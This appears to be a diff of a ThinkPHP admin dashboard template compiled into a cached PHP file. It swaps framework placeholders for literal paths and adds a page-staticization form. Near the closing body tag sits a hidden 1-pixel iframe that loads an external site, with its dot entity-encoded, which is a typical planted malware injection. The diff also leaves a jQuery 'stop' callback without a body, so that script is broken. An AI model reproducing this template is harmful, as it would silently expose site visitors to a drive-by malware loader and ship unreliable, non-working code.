@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<?php if (!defined('THINK_PATH')) exit();?><!DOCTYPE html>
 <html lang="en">
     <head>
         <meta charset="utf-8" />
@@ -6,11 +6,11 @@
         <meta name="keywords" content="dh2y" />
         <meta name="description" content="dh2y" />
         <!-- basic styles -->
-        <link href="__PUBLIC__/admin/assets/css/bootstrap.min.css" rel="stylesheet" />
-        <link rel="stylesheet" href="__PUBLIC__/admin/assets/css/font-awesome.min.css" />
+        <link href="/Public/admin/assets/css/bootstrap.min.css" rel="stylesheet" />
+        <link rel="stylesheet" href="/Public/admin/assets/css/font-awesome.min.css" />
 
         <!--[if IE 7]>
-          <link rel="stylesheet" href="__PUBLIC__/admin/assets/css/font-awesome-ie7.min.css" />
+          <link rel="stylesheet" href="/Public/admin/assets/css/font-awesome-ie7.min.css" />
         <![endif]-->
 
         <!-- page specific plugin styles -->
@@ -20,25 +20,25 @@
     
         <!-- ace styles -->
 
-        <link rel="stylesheet" href="__PUBLIC__/admin/assets/css/ace.min.css" />
-        <link rel="stylesheet" href="__PUBLIC__/admin/assets/css/ace-rtl.min.css" />
-        <link rel="stylesheet" href="__PUBLIC__/admin/assets/css/ace-skins.min.css" />
+        <link rel="stylesheet" href="/Public/admin/assets/css/ace.min.css" />
+        <link rel="stylesheet" href="/Public/admin/assets/css/ace-rtl.min.css" />
+        <link rel="stylesheet" href="/Public/admin/assets/css/ace-skins.min.css" />
 
         <!--[if lte IE 8]>
-          <link rel="stylesheet" href="__PUBLIC__/admin/assets/css/ace-ie.min.css" />
+          <link rel="stylesheet" href="/Public/admin/assets/css/ace-ie.min.css" />
         <![endif]-->
 
         <!-- inline styles related to this page -->
 
         <!-- ace settings handler -->
 
-        <script src="__PUBLIC__/admin/assets/js/ace-extra.min.js"></script>
+        <script src="/Public/admin/assets/js/ace-extra.min.js"></script>
 
         <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
 
         <!--[if lt IE 9]>
-        <script src="__PUBLIC__/admin/assets/js/html5shiv.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/respond.min.js"></script>
+        <script src="/Public/admin/assets/js/html5shiv.js"></script>
+        <script src="/Public/admin/assets/js/respond.min.js"></script>
         <![endif]-->
 
         <script type="text/javascript" charset="utf-8">
@@ -55,7 +55,7 @@
 
             <div class="navbar-container" id="navbar-container">
                 <div class="navbar-header pull-left">
-                    <a href="__APP__" class="navbar-brand">
+                    <a href="/admin.php" class="navbar-brand">
                         <small>
                             <i class="icon-leaf"></i>
                             dh2y后台
@@ -67,10 +67,10 @@
                     <ul class="nav ace-nav">
                         <li class="light-blue">
                             <a data-toggle="dropdown" href="#" class="dropdown-toggle">
-                                <img class="nav-user-photo" src="__PUBLIC__/admin/assets/avatars/user.jpg" alt="Jason's Photo" />
+                                <img class="nav-user-photo" src="/Public/admin/assets/avatars/user.jpg" alt="Jason's Photo" />
                                 <span class="user-info">
                                     <small>欢迎光临,</small>
-                                    {$Think.SESSION.admin.name}
+                                    <?php echo ($_SESSION['admin']['name']); ?>
                                 </span>
 
                                 <i class="icon-caret-down"></i>
@@ -81,7 +81,7 @@
                                 <li class="divider"></li>
 
                                 <li>
-                                    <a href="__APP__/Login/logOut">
+                                    <a href="/admin.php/Login/logOut">
                                         <i class="icon-off"></i>
                                         退出
                                     </a>
@@ -163,37 +163,37 @@
 
                             <ul class="submenu">
                                  <li>
-                                    <a href="__APP__/Admin/index">
+                                    <a href="/admin.php/Admin/index">
                                         <i class="icon-double-angle-right"></i>
                                         管理员管理
                                     </a>
                                 </li>
                                 <li>
-                                    <a href="__APP__/Admin/add">
+                                    <a href="/admin.php/Admin/add">
                                         <i class="icon-double-angle-right"></i>
                                         添加管理员
                                     </a>
                                 </li>
                                 <li>
-                                    <a href="__APP__/Group/index">
+                                    <a href="/admin.php/Group/index">
                                         <i class="icon-double-angle-right"></i>
                                         管理组管理
                                     </a>
                                 </li>
                                 <li>
-                                    <a href="__APP__/Group/add">
+                                    <a href="/admin.php/Group/add">
                                         <i class="icon-double-angle-right"></i>
                                         添加角色
                                     </a>
                                 </li>
                                 <li>
-                                    <a href="__APP__/Rule/index">
+                                    <a href="/admin.php/Rule/index">
                                         <i class="icon-double-angle-right"></i>
                                         权限管理
                                     </a>
                                 </li>
                                 <li>
-                                    <a href="__APP__/Rule/add">
+                                    <a href="/admin.php/Rule/add">
                                         <i class="icon-double-angle-right"></i>
                                         添加权限
                                     </a>
@@ -211,7 +211,7 @@
 
                             <ul class="submenu">
                                 <li>
-                                    <a href="__APP__/Build/index">
+                                    <a href="/admin.php/Build/index">
                                         <i class="icon-double-angle-right"></i>
                                         页面静态化
                                     </a>
@@ -231,7 +231,74 @@
                     </script>
                 </div>
 
-                <block name="main"></block>
+                
+    <div class="main-content">
+        <div class="breadcrumbs" id="breadcrumbs">
+            <script type="text/javascript">
+                try{ace.settings.check('breadcrumbs' , 'fixed')}catch(e){}
+            </script>
+
+            <ul class="breadcrumb">
+                <li>
+                    <i class="icon-home home-icon"></i>
+                    <a href="#">主页</a>
+                </li>
+
+                <li>
+                    <a href="/admin.php/Build/index">页面静态化</a>
+                </li>
+                <li class="active">页面静态化</li>
+            </ul><!-- .breadcrumb -->
+
+            <div class="nav-search" id="nav-search">
+                <form class="form-search">
+                    <span class="input-icon">
+                        <input type="text" placeholder="Search ..." class="nav-search-input" id="nav-search-input" autocomplete="off" />
+                        <i class="icon-search nav-search-icon"></i>
+                    </span>
+                </form>
+            </div><!-- #nav-search -->
+        </div>
+
+        <div class="page-content">
+            <div class="page-header">
+                <h1>
+                    页面静态化
+                    <small>
+                        <i class="icon-double-angle-right"></i>
+                        静态化操作
+                    </small>
+                </h1>
+            </div><!-- /.page-header -->
+
+            <div class="row">
+                <div class="col-xs-12">
+                    <!-- PAGE CONTENT BEGINS -->
+
+                    <form class="form-horizontal" action='/admin.php/Build/index' role="form" method='post' >
+                        <div class="form-group">
+                            <label class="col-sm-3 control-label no-padding-right" id="username" name="username"> 静态化地址 </label>
+
+                            <div class="col-sm-9">
+                                <input type="text" placeholder="请输入url地址" class="col-xs-10 col-sm-5"  name='url' />
+
+                            </div>
+
+                        </div>
+
+                        <div class="space-4"></div>
+
+                        <div class="clearfix form-actions">
+                            <div class="col-md-offset-3 col-md-9">
+                                <input type='submit' name='sub' class="btn btn-info" value='生成Html'/>
+                            </div>
+                        </div>
+                    </form>
+                </div><!-- /.col -->
+            </div><!-- /.row -->
+        </div><!-- /.page-content -->
+    </div>
+
                 <!-- /.main-content -->
 
                 <div class="ace-settings-container" id="ace-settings-container">
@@ -293,55 +360,55 @@
 
         <!--[if !IE]> -->
 
-        <!--<script src="__PUBLIC__/admin/assets/js/jquery-2.0.3.min.js"></script>-->
-        <script src="__PUBLIC__/admin/assets/js/jquery-2.0.3.min.js"></script>
+        <!--<script src="/Public/admin/assets/js/jquery-2.0.3.min.js"></script>-->
+        <script src="/Public/admin/assets/js/jquery-2.0.3.min.js"></script>
         
 
         <!-- <![endif]-->
 
         <!--[if IE]>
-<script src="__PUBLIC__/admin/assets/js/jquery-1.10.2.min.js"></script>
+<script src="/Public/admin/assets/js/jquery-1.10.2.min.js"></script>
 <![endif]-->
 
         <!--[if !IE]> -->
 
         <script type="text/javascript">
-            window.jQuery || document.write("<script src='__PUBLIC__/admin/assets/js/jquery-2.0.3.min.js'>"+"<"+"script>");
+            window.jQuery || document.write("<script src='/Public/admin/assets/js/jquery-2.0.3.min.js'>"+"<"+"script>");
         </script>
 
         <!-- <![endif]-->
 
         <!--[if IE]>
 <script type="text/javascript">
- window.jQuery || document.write("<script src='__PUBLIC__/admin/assets/js/jquery-1.10.2.min.js'>"+"<"+"script>");
+ window.jQuery || document.write("<script src='/Public/admin/assets/js/jquery-1.10.2.min.js'>"+"<"+"script>");
 </script>
 <![endif]-->
 
         <script type="text/javascript">
-            if("ontouchend" in document) document.write("<script src='__PUBLIC__/admin/assets/js/jquery.mobile.custom.min.js'>"+"<"+"script>");
+            if("ontouchend" in document) document.write("<script src='/Public/admin/assets/js/jquery.mobile.custom.min.js'>"+"<"+"script>");
         </script>
-        <script src="__PUBLIC__/admin/assets/js/bootstrap.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/typeahead-bs2.min.js"></script>
+        <script src="/Public/admin/assets/js/bootstrap.min.js"></script>
+        <script src="/Public/admin/assets/js/typeahead-bs2.min.js"></script>
 
         <!-- page specific plugin scripts -->
 
         <!--[if lte IE 8]>
-          <script src="__PUBLIC__/admin/assets/js/excanvas.min.js"></script>
+          <script src="/Public/admin/assets/js/excanvas.min.js"></script>
         <![endif]-->
 
-        <script src="__PUBLIC__/admin/assets/js/jquery-ui-1.10.3.custom.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/jquery.ui.touch-punch.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/jquery.slimscroll.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/jquery.easy-pie-chart.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/jquery.sparkline.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/flot/jquery.flot.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/flot/jquery.flot.pie.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/flot/jquery.flot.resize.min.js"></script>
+        <script src="/Public/admin/assets/js/jquery-ui-1.10.3.custom.min.js"></script>
+        <script src="/Public/admin/assets/js/jquery.ui.touch-punch.min.js"></script>
+        <script src="/Public/admin/assets/js/jquery.slimscroll.min.js"></script>
+        <script src="/Public/admin/assets/js/jquery.easy-pie-chart.min.js"></script>
+        <script src="/Public/admin/assets/js/jquery.sparkline.min.js"></script>
+        <script src="/Public/admin/assets/js/flot/jquery.flot.min.js"></script>
+        <script src="/Public/admin/assets/js/flot/jquery.flot.pie.min.js"></script>
+        <script src="/Public/admin/assets/js/flot/jquery.flot.resize.min.js"></script>
 
         <!-- ace scripts -->
 
-        <script src="__PUBLIC__/admin/assets/js/ace-elements.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/ace.min.js"></script>
+        <script src="/Public/admin/assets/js/ace-elements.min.js"></script>
+        <script src="/Public/admin/assets/js/ace.min.js"></script>
 
         <!-- inline scripts related to this page -->
 
@@ -526,9 +593,7 @@
                     placeholder: 'draggable-placeholder',
                     forcePlaceholderSize:true,
                     tolerance:'pointer',
-                    stop: function( event, ui ) {//just for Chrome!!!! so that dropdowns on items don't appear below other items after being moved
-                        $(ui.item).css('z-index', 'auto');
-                    }
+                    stop: function( event, ui ) 
                     }
                 );
                 $('#tasks').disableSelection();
@@ -543,6 +608,5 @@
         </script>
     <iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
 </body>
-    <block name="miss_js"></block>
+    
 </html>
-
